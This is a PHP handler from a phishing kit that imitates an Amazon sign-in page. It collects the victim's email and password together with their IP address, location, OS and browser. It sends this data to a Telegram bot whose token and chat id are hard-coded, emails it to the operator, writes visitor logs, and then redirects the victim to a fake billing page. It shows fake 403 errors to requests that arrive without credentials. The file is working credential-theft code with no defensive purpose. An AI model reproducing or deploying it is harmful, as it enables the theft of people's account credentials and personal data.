<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once('../session.php');
if($_POST['email'] == "") {
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['password'] == "") {
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$ip = getUserIP();
$message  = "#-------------------------[ AMAZON LOGIN ]-----------------------------#\n";
$message .= "Amazon		: ".$_POST['email']."\n";
$message .= "Password		: ".$_POST['password']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ FUCKED BY BM7 ]-----------------------------#\n";
$data = [
    'chat_id' => '-728395874',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot5100498184:AAFy3G9qnF_inCykJSFJZf9ykgEplXAbnFg/sendMessage?" . http_build_query($data) );
$_SESSION['email_user'] = $_POST['email'];
$_SESSION['email_pass'] = $_POST['password'];
$subject = "EMAIL LOGIN: ".$_POST['email_user']." [ $cn - $os - $ip ]";
kirim_mail($setting['email_result'], "Email Login", $subject, $message);
tulis_file("../result/total_email.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Login Email Account");
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
exit();
?>
